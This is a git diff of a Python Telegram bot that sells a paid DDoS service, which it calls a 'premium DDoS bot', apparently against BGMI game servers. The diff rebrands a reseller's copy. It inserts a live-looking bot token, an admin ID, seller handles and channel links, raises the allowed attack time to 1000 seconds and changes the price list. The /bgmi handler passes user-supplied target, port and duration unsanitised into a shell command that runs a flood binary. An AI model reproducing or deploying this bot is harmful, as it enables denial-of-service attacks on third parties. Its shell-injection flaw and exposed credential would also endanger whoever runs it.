@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEN')
+bot = telebot.TeleBot('7264916952:AAHeAf23lAB_SepbcC9PaoRbzxVjrTYDj8s')
 
 # Admin user IDs
-admin_id = ["your id"]
+admin_id = ["5542001402"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -189,7 +189,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy 🙇."
+        response = "You have not purchased yet purchase now from:- @SHILIONRG 🙇."
 
     bot.reply_to(message, response)
 
@@ -208,7 +208,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "You have not purchased yet purchase now from :- @venomXcrazy ❄."
+        response = "You have not purchased yet purchase now from :- @SHILIONRG❄."
     bot.reply_to(message, response)
 
 
@@ -227,7 +227,7 @@ def clear_users_command(message):
         except FileNotFoundError:
             response = "users are already cleared ❌."
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @venomXcrazy 🙇."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @SHILIONRG 🙇."
     bot.reply_to(message, response)
  
 
@@ -252,7 +252,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:-@SHILIONRG ❄."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
@@ -270,7 +270,7 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @SHILIONRG ❄."
         bot.reply_to(message, response)
 
 
@@ -279,7 +279,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @venomXcrazy"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @SHILIONRG"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -307,20 +307,20 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 1000:
+                response = "Error: Time interval must be less than 1000."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 700"
+                full_command = f"./bgmi {target} {port} {time} 1000"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @SHILIONRG")
 
     bot.reply_to(message, response)
 
@@ -357,8 +357,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @venomXcrazy
-Official Channel :- https://t.me/V3NOM_CH3AT
+Buy From :- @SHILIONRG
+Official Channel :- https://t.me/uUXpo73P1WFjNDQ1
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -375,7 +375,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-✅BUY :- @venomXcrazy'''
+✅BUY :- @SHILIONRG'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -385,7 +385,7 @@ def welcome_rules(message):
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/venomcha7 OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED https://t.me/uUXpo73P1WFjNDQ1 OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
@@ -395,12 +395,12 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 300 (S)
+-> Attack Time : 1000(S)
 > After Attack Limit : 10 sec
 -> Concurrents Attack : 5
 
 Pr-ice List💸 :
-Day-->80 Rs
+Day-->150 Rs
 Week-->400 Rs
 Month-->1000 Rs
 '''
